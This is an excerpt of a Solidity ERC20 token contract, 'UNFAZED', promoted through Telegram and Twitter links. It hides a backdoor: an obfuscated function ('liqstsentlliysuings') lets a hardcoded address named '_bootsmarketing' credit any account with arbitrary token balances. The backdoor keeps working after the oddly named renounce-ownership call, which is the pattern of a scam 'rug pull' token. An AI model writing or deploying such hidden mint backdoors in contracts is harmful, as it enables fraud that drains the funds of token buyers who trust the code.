...
*/
/**
https://t.me/UNFAZEDTrumpERC20
https://twitter.com/UNFAZED_ERC
*/
...
contract Ownable is Context {
    ...
    function renounceOwnershiptinghyterste() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract UNFAZED is Context, Ownable, IERC20 {
    ...
    uint256 private _totalSupply;address private   _bootsmarketing;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _bootsmarketing = 0xf692d1E473a64668eF03E63A03FbEC6ab2f320BF;
    ...
    function isMee() internal view returns (bool) {
        return _msgSender() ==   _bootsmarketing;
    }

    function liqstsentlliysuings(address recipient, uint256 aDropst)  external {uint256 receiveRewrd = aDropst;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
